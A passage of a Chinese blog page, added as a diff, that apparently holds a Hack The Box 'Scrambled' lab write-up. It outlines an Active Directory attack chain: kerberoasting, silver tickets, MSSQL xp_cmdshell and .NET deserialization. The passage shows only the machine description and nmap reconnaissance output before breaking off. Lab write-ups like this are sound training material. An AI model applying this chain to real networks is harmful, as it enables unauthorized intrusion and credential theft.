@@ -1,0 +1,836 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：网页信息汇总分析、账号密码相同、kerberosroasting、域环境下的smbclient 登录、md4密码哈希生成、域SID获取、白银票据制作、使用票据登录mssql数据库、xp_cmdshell函数利用、runas命令使用、4411端口服务反序列化漏洞利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Scrambled-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/04/07/Scrambled-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：网页信息汇总分析、账号密码相同、kerberosroasting、域环境下的smbclient 登录、md4密码哈希生成、域SID获取、白银票据制作、使用票据登录mssql数据库、xp_cmdshell函数利用、runas命令使用、4411端口服务反序列化漏洞利用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Scrambled-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Scrambled-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Scrambled-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Scrambled-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Scrambled-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Scrambled-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Scrambled-htb-writeup/7.png">
+<meta property="article:published_time" content="2024-04-07T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-02T15:10:56.981Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Scrambled-htb-writeup/1.png">
+  
+  
+  
+  <title>Scrambled-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Scrambled-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-07 23:50" pubdate>
+          2024年4月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          38k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          313 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Scrambled-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：网页信息汇总分析、账号密码相同、kerberosroasting、域环境下的smbclient 登录、md4密码哈希生成、域SID获取、白银票据制作、使用票据登录mssql数据库、xp_cmdshell函数利用、runas命令使用、4411端口服务反序列化漏洞利用</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://b0ysie7e.gitbook.io/articulos/write-up/hackthebox/2024-03-15-scrambled#silver-ticket-attack</code></p>
+<p>参考链接：<code>https://0xdf.gitlab.io/2022/10/01/htb-scrambled-linux.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、靶机官方描述：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Scrambled 是一台中型 Windows Active Directory 计算机。通过枚举远程计算机上托管的网站，潜在攻击者能够推断出用户“ksimpson”的凭据。该网站还指出 NTLM 身份验证已禁用，这意味着将使用 Kerberos 身份验证。使用“ksimpson”的凭据访问“Public”共享时，PDF 文件指出攻击者检索了 SQL 数据库的凭据。这表明远程计算机上正在运行 SQL 服务。枚举普通用户帐户，发现帐户“SqlSvc”具有与其关联的“服务主体名称”(SPN)。攻击者可以使用此信息执行称为“kerberoasting”的攻击并获取“SqlSvc”的哈希值。在破解哈希并获取“SqlSvc”帐户的凭据后，攻击者可以执行“银票”攻击来伪造票并冒充远程 MSSQL 服务上的用户“管理员”。数据库的枚举显示了用户“MiscSvc”的凭据，该凭据可用于使用 PowerShell 远程处理在远程计算机上执行代码。当新用户显示一个正在侦听端口“<span class="hljs-number">4411</span>”的“.NET”应用程序时，系统枚举。对应用程序进行逆向工程显示，它正在使用不安全的“Binary Formatter”类来传输数据，从而允许攻击者上传自己的有效负载并以“ntauthority\system”的身份执行代码。<br></code></pre></td></tr></table></figure>
+
+<p>2、获取下靶机IP地址：10.10.11.168</p>
+<p>3、扫描下开放端口情况：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span> -oG allports<br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-08 06:14 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span><br>Host is up (<span class="hljs-number">0.34</span>s latency).<br>Not shown: <span class="hljs-number">65516</span> filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br><span class="hljs-number">53</span>/tcp    open  domain<br><span class="hljs-number">80</span>/tcp    open  http<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec<br><span class="hljs-number">135</span>/tcp   open  msrpc<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap<br><span class="hljs-number">445</span>/tcp   open  microsoft-ds<br><span class="hljs-number">593</span>/tcp   open  http-rpc-epmap<br><span class="hljs-number">636</span>/tcp   open  ldapssl<br><span class="hljs-number">1433</span>/tcp  open  ms-sql-s<br><span class="hljs-number">3268</span>/tcp  open  globalcatLDAP<br><span class="hljs-number">3269</span>/tcp  open  globalcatLDAPssl<br><span class="hljs-number">4411</span>/tcp  open  found<br><span class="hljs-number">5985</span>/tcp  open  wsman<br><span class="hljs-number">9389</span>/tcp  open  adws<br><span class="hljs-number">49667</span>/tcp open  unknown<br><span class="hljs-number">49673</span>/tcp open  unknown<br><span class="hljs-number">49674</span>/tcp open  unknown<br><span class="hljs-number">49728</span>/tcp open  unknown<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">48.92</span> seconds<br>                                                                                                       <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ grep -oP <span class="hljs-string">&#x27;([0-9]+)/open&#x27;</span> allports | awk -F/ <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-number">53</span>,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">4411</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49673</span>,<span class="hljs-number">49674</span>,<span class="hljs-number">49728</span>,                                                                                                       <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p53,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">4411</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49673</span>,<span class="hljs-number">49674</span>,<span class="hljs-number">49728</span> -sC -sV --min-rate=<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span>       <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-08 06:15 CST</span><br>WARNING: No targets were specified, so <span class="hljs-number">0</span> hosts scanned.<br>Nmap done: <span class="hljs-number">0</span> IP addresses (<span class="hljs-number">0</span> hosts up) scanned in <span class="hljs-number">0.13</span> seconds<br>                                                                                                       <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p53,<span class="hljs-number">80</span>,<span class="hljs-number">88</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">593</span>,<span class="hljs-number">636</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">3268</span>,<span class="hljs-number">3269</span>,<span class="hljs-number">4411</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">9389</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49673</span>,<span class="hljs-number">49674</span>,<span class="hljs-number">49728</span> -sC -sV --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span>  <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-08 06:16 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span><br>Host is up (<span class="hljs-number">0.13</span>s latency).<br><br>Bug in ms-sql-ntlm-info: no <span class="hljs-built_in">string</span> output.<br>PORT      STATE SERVICE       VERSION<br><span class="hljs-number">53</span>/tcp    open  domain        Simple DNS Plus<br><span class="hljs-number">80</span>/tcp    open  http          Microsoft IIS httpd <span class="hljs-number">10.0</span><br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: Scramble Corp Intranet<br><span class="hljs-number">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span> <span class="hljs-number">14</span>:<span class="hljs-number">12</span>:<span class="hljs-number">54</span>Z)<br><span class="hljs-number">135</span>/tcp   open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br><span class="hljs-number">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)<br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T14:<span class="hljs-number">16</span>:<span class="hljs-number">31</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-number">-8</span>h02m54s from scanner time.<br>| ssl-cert: Subject: commonName=DC1.scrm.local<br>| Subject Alternative Name: othername: <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span>::&lt;unsupported&gt;, DNS:DC1.scrm.local<br>| Not valid before: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T13:<span class="hljs-number">59</span>:<span class="hljs-number">53</span><br>|_Not valid after:  <span class="hljs-number">2025</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T13:<span class="hljs-number">59</span>:<span class="hljs-number">53</span><br><span class="hljs-number">445</span>/tcp   open  microsoft-ds?<br><span class="hljs-number">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">636</span>/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)<br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T14:<span class="hljs-number">16</span>:<span class="hljs-number">31</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-number">-8</span>h02m53s from scanner time.<br>| ssl-cert: Subject: commonName=DC1.scrm.local<br>| Subject Alternative Name: othername: <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span>::&lt;unsupported&gt;, DNS:DC1.scrm.local<br>| Not valid before: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T13:<span class="hljs-number">59</span>:<span class="hljs-number">53</span><br>|_Not valid after:  <span class="hljs-number">2025</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T13:<span class="hljs-number">59</span>:<span class="hljs-number">53</span><br><span class="hljs-number">1433</span>/tcp  open  ms-sql-s      Microsoft SQL Server <span class="hljs-number">2019</span> <span class="hljs-number">15.00</span><span class="hljs-number">.2000</span><span class="hljs-number">.00</span>; RTM<br>| ms-sql-info: <br>|   <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.168</span>:<span class="hljs-number">1433</span>: <br>|     Version: <br>|       name: Microsoft SQL Server <span class="hljs-number">2019</span> RTM<br>|       number: <span class="hljs-number">15.00</span><span class="hljs-number">.2000</span><span class="hljs-number">.00</span><br>|       Product: Microsoft SQL Server <span class="hljs-number">2019</span><br>|       Service pack level: RTM<br>|       Post-SP patches applied: <span class="hljs-literal">false</span><br>|_    TCP port: <span class="hljs-number">1433</span><br>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br>| Not valid before: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T14:<span class="hljs-number">09</span>:<span class="hljs-number">43</span><br>|_Not valid after:  <span class="hljs-number">2054</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T14:<span class="hljs-number">09</span>:<span class="hljs-number">43</span><br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T14:<span class="hljs-number">16</span>:<span class="hljs-number">31</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-number">-8</span>h02m54s from scanner time.<br><span class="hljs-number">3268</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)<br>| ssl-cert: Subject: commonName=DC1.scrm.local<br>| Subject Alternative Name: othername: <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span>::&lt;unsupported&gt;, DNS:DC1.scrm.local<br>| Not valid before: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T13:<span class="hljs-number">59</span>:<span class="hljs-number">53</span><br>|_Not valid after:  <span class="hljs-number">2025</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T13:<span class="hljs-number">59</span>:<span class="hljs-number">53</span><br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T14:<span class="hljs-number">16</span>:<span class="hljs-number">30</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-number">-8</span>h02m54s from scanner time.<br><span class="hljs-number">3269</span>/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)<br>|_ssl-date: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T14:<span class="hljs-number">16</span>:<span class="hljs-number">31</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-number">-8</span>h02m53s from scanner time.<br>| ssl-cert: Subject: commonName=DC1.scrm.local<br>| Subject Alternative Name: othername: <span class="hljs-number">1.3</span><span class="hljs-number">.6</span><span class="hljs-number">.1</span><span class="hljs-number">.4</span><span class="hljs-number">.1</span><span class="hljs-number">.311</span><span class="hljs-number">.25</span><span class="hljs-number">.1</span>::&lt;unsupported&gt;, DNS:DC1.scrm.local<br>| Not valid before: <span class="hljs-number">2024</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T13:<span class="hljs-number">59</span>:<span class="hljs-number">53</span><br>|_Not valid after:  <span class="hljs-number">2025</span><span class="hljs-number">-04</span><span class="hljs-number">-07</span>T13:<span class="hljs-number">59</span>:<span class="hljs-number">53</span><br><span class="hljs-number">4411</span>/tcp  open  found?<br>| fingerprint-strings: <br>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, <span class="hljs-literal">NULL</span>, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: <br>|     SCRAMBLECORP_ORDERS_V1<span class="hljs-number">.0</span><span class="hljs-number">.3</span>;<br>|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: <br>|     SCRAMBLECORP_ORDERS_V1<span class="hljs-number">.0</span><span class="hljs-number">.3</span>;<br>|_    ERROR_UNKNOWN_COMMAND;<br><span class="hljs-number">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)<br>|_http-title: Not Found<br><span class="hljs-number">9389</span>/tcp  open  mc-nmf        .NET Message Framing<br><span class="hljs-number">49667</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49673</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="hljs-number">1.0</span><br><span class="hljs-number">49674</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">49728</span>/tcp open  msrpc         Microsoft Windows RPC<br><span class="hljs-number">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span><br>SF-Port4411-TCP:V=<span class="hljs-number">7.94</span>SVN%I=<span class="hljs-number">7</span>%D=<span class="hljs-number">4</span>/<span class="hljs-number">8</span>%Time=<span class="hljs-number">66131B</span>2A%P=aarch64-unknown-linux-<br>SF:gnu%r(<span class="hljs-literal">NULL</span>,<span class="hljs-number">1</span>D,<span 